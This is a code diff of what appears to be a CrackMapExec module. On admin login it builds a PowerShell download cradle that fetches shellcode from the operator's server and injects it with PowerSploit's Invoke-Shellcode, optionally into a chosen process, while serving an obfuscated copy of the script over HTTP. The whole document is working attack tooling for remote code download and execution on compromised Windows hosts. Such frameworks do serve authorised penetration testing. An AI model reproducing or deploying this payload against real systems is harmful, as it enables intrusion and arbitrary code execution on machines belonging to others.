@@ -33,26 +33,25 @@ class CMEModule:
         if 'PROCID' in module_options.keys():
             self.procid = module_options['PROCID']
 
-        self.obfs_name = gen_random_string()
+        self.ps_script = obfs_ps_script('powersploit/CodeExecution/Invoke-Shellcode.ps1')
 
     def on_admin_login(self, context, connection):
 
         payload = """
-        IEX (New-Object Net.WebClient).DownloadString('{server}://{addr}:{port}/Invoke-Shellcode.ps1');
         $WebClient = New-Object System.Net.WebClient;
         [Byte[]]$bytes = $WebClient.DownloadData('{server}://{addr}:{port}/{shellcode}');
         Invoke-Shellcode -Force -Shellcode $bytes""".format(server=context.server,
                                                               port=context.server_port,
                                                               addr=context.localip,
-                                                              func_name=self.obfs_name,
                                                               shellcode=os.path.basename(self.shellcode_path))
 
         if self.procid:
             payload += ' -ProcessID {}'.format(self.procid)
 
-        context.log.debug('Payload:{}'.format(payload))
-        payload = create_ps_command(payload, force_ps32=True)
-        connection.execute(payload)
+        launcher = gen_ps_iex_cradle(context, 'Invoke-Shellcode.ps1', payload, post_back=False)
+
+        ps_command = create_ps_command(launcher, force_ps32=True)
+        connection.execute(ps_command)
         context.log.success('Executed payload')
 
     def on_request(self, context, request):
@@ -60,9 +59,7 @@ class CMEModule:
             request.send_response(200)
             request.end_headers()
 
-            with open(get_ps_script('powersploit/CodeExecution/Invoke-Shellcode.ps1') ,'r') as ps_script:
-                ps_script = obfs_ps_script(ps_script.read(), self.obfs_name)
-                request.wfile.write(ps_script)
+            request.wfile.write(self.ps_script)
 
         elif os.path.basename(self.shellcode_path) == request.path[1:]:
             request.send_response(200)
